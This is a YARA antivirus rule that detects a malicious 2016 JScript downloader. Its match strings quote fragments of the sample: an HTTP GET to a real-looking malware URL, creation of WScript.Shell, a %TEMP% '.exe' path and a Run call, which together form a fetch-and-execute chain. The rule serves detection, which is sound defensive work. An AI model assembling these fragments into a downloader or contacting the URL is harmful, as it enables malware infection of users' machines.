rule sig_20160330_c380ca68e6af660c9f592befe2c4c5b9 {
  meta:
    description = "datamaliciousorder - file 20160330_c380ca68e6af660c9f592befe2c4c5b9.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3077acfd7b04ade373af71e3625c890eba670668b70526a08afced29b50dd710"

  strings:
    $s1  = "Y0[Y](\"GET\", \"http://be-stlines-tore.com/u3rsap\", false);" fullword ascii
    $s2  = "var M1 = function GH() {return WScript[U](\"WScript\"+\".Shell\");}(), VS = 11;" fullword ascii
    $s3  = "function S(O0, PJ){Q = Q * 1; return O0 - PJ;};" fullword ascii
    $s4  = "if (Y0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function XO() {return M1[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"nts8JrYLm.ex\" + \"e\";};" fullword ascii
    $s6  = "function M(){return L + \"\";};" fullword ascii
    $s7  = "function R(E){M1[\"Run\"](E, Q, Q);};" fullword ascii
    $s8  = "function QE() {return ((U0 == true) && (U0 == CH)) ? 1 : Q;};" fullword ascii
    $s9  = "var Z0 = new this[\"Date\"]();" fullword ascii
    $s10 = "}while (O);" fullword ascii
    $s11 = "function SV(){return U;};" fullword ascii
    $s12 = "function ZY(M0) {var LC = (1, 2, 3, 4, 5, M0); return LC;};" fullword ascii
    $s13 = "function MM(){return 22;};" fullword ascii
    $s14 = "return S(TD, A0);" fullword ascii
    $s15 = "function MG()" fullword ascii
    $s16 = "var U1 = false;" fullword ascii
    $s17 = "U0 = true; " fullword ascii
    $s18 = "var CH = false;" fullword ascii
    $s19 = "CH = true; " fullword ascii
    $s20 = "var U0 = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}